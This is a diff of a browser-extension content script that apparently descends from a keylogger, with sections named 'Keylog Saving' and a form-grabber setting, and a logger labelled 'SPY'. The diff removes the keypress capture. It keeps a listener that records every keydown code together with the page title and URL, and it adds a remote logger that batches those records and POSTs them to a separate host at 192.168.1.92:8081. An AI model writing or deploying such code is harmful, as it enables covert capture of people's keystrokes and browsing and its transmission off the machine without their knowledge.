@@ -4,75 +4,23 @@ if (!document.title) {
 }
 
 /* SSE */
-
 var _events = ["subtitle", "pushvod", "pdl", "player", "eit", "records", "cas", "prm", "network", "storage", "system", "scanning", "avio", "hls", "respawn", "open", "error"];
 var source = new window.EventSource('/stream');
 
 _events.forEach(function(_event) {
     source.addEventListener(_event, function(e) {
-      console.log("[SSE] ["+_event+"] "+e.data);
+      LOG('SSE', _event, e.data);
     }, false);
 });
 
-/* Keylib */
-// Alphanumeric
-document.addEventListener('keypress', function (e) {
-    e = e || window.event;
-    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-    if (charCode) {
-        log(String.fromCharCode(charCode));
-    }
-});
-
-// Other keys
+/* Keydown */
 chrome.storage.sync.get({allKeys: false}, function(settings) {
-
     document.addEventListener('keydown', function (e) {
-        log("[KEYDOWN] " + e.keyCode);
+        LOG('KEYDOWN' , e.keyCode);
     });
-
-/*    if (settings.allKeys) {
-        document.addEventListener('keydown', function (e) {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            } else if (charCode == 16) {
-                log("[SHIFT]");
-            } else if (charCode == 17) {
-                log("[CTRL]");
-            } else if (charCode == 18) {
-                log("[ALT]");
-            } else if (charCode == 91) {
-                log("[L WINDOW]"); // command for mac
-            } else if (charCode == 92) {
-                log("[R WINDOW]"); // command for mac
-            } else if (charCode == 93) {
-                log("[SELECT/CMD]"); // command for mac
-            }
-        });
-    } else { // Non function keys
-        document.addEventListener('keydown', function (e) {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            }
-        });
-    }
-*/
 });
 
-
-/* Keylog Saving */
+/* Log Saving */
 var time = new Date().getTime();
 var data = {};
 var shouldSave = false;
@@ -80,7 +28,7 @@ var lastLog = time;
 data[time] = document.title + "^~^" + document.URL + "^~^";
 
 // Key'ed on JS timestamp
-function log(input) {
+function _log(input) {
     var now = new Date().getTime();
     if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
     data[time] += input;
@@ -152,3 +100,89 @@ chrome.storage.sync.get({formGrabber: false}, function(settings) {
         }
     }
 });
+
+var global = {
+  LOGGER_NAME: 'remote',
+  LOGGER_OPTIONS: {
+    url: "http://192.168.1.92:8081"
+  }
+};
+
+var LEVELS = ['debug', 'info', 'warning', 'error', 'fatal'];
+var _slice = Array.prototype.slice;
+
+
+function filter(args, namespace) {
+  var f = global.LOGGER_FILTERS;
+  if (f && f[namespace]) { return; }
+  return _slice.call(args);
+}
+
+
+function REMOTE_LOGGER(options) {
+    var flush    = [],
+    size     = options.batchSize || 50,
+    interval = options.batchInterval || 5000,
+    url      = options.url;
+
+    function send() {
+        var logs = flush.splice(0, size),
+        data = JSON.stringify(logs),
+        xhr  = new XMLHttpRequest();
+
+        function done() {
+            if (xhr.status >= 300) { return fail(); }
+            if (flush.length) { setTimeout(send, interval); }
+        }
+
+        function fail() {
+            flush.unshift.apply(flush, logs);
+            setTimeout(send, interval);
+        }
+
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.addEventListener('load',  done, false);
+        xhr.addEventListener('error', fail, false);
+        xhr.send(data);
+    }
+    
+    return function(args, namespace, level) {
+        if (!url) { return; }
+        var log = {
+            namespace: namespace,
+            level: level,
+            date: new Date(),
+            args: args
+        };
+        if (flush.push(log) === 1) {
+            setTimeout(send, interval);
+        }
+    };
+}
+
+  var list = {
+//    'console': CONSOLE_LOGGER,
+//    'html':    HTML_LOGGER,
+    'remote':  REMOTE_LOGGER
+  };
+
+  var names = (global.LOGGER_NAME || '').split(',');
+  var loggers = names.map(function(name) {
+    var logger = list[name];
+    return logger && logger(global.LOGGER_OPTIONS || {});
+  });
+
+  function LOGGER(namespace) {
+    var logger = function() {
+      if (!loggers.length) { return; }
+      var args = filter(arguments, namespace);
+      var levl = (this && this.LOG_LEVEL) || 'info';
+      args && loggers.forEach(function(l) {
+        l(args, namespace, levl);
+      });
+    };
+    return logger;
+  }
+
+var LOG = LOGGER('SPY');
